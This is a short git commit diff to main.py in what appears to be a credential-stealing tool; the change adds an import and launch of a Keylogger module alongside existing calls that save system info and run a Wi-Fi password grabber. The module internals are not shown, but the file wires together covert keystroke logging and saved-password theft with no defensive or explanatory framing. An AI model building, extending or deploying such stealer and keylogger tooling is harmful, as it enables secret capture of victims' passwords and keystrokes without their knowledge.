c72f900207026e4428faa95e92d19de10ecf050c
Josakko <112590914+Josakko@users.noreply.github.com>
2023-04-25 23:04:51 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,7 +1,12 @@
 from modules.info import save
 from modules.wifi import WifiPasswords
+from modules.keylogger import Keylogger
 
 
 save()
+
 wifi = WifiPasswords()
 wifi.run()
+
+Logger = Keylogger()
+Logger.run()
